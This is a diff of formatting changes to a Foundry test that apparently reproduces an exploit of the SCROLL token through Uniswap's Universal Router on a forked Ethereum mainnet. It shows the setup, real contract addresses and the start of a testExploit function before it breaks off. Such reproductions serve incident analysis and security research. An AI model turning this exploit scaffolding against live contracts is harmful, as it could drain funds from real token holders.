@@ -15,7 +15,7 @@ import "../interface.sol";
 // @Analysis
 // Twitter Guy : https://x.com/0xNickLFranklin/status/1795650745448169741
 
-interface IUniversalRouter{
+interface IUniversalRouter {
     function execute(bytes calldata commands, bytes[] calldata input) external payable;
 }
 
@@ -26,20 +26,19 @@ contract ContractTest is Test {
     IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     Uni_Pair_V2 SCROLL_WETH_pair = Uni_Pair_V2(0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2);
     IUniversalRouter universalRouter = IUniversalRouter(payable(0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD));
-    
+
     IERC20 constant SCROLL = IERC20(0xe51D3dE9b81916D383eF97855C271250852eC7B7);
     WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
-    
     function setUp() public {
-        vm.createSelectFork("mainnet", 19971611-1);
+        vm.createSelectFork("mainnet", 19_971_611 - 1);
         vm.label(address(SCROLL), "SCROLL");
         vm.label(address(WETH), "WETH");
         vm.label(address(universalRouter), "Universal Router");
         vm.label(address(SCROLL_WETH_pair), "Uniswap V2 pair SCROLL WETH");
         vm.label(address(router), "Uniswap V2 Router");
     }
-    
+
     function testExploit() public {
         SCROLL.balanceOf(address(universalRouter));
         bytes memory commands = hex"05";
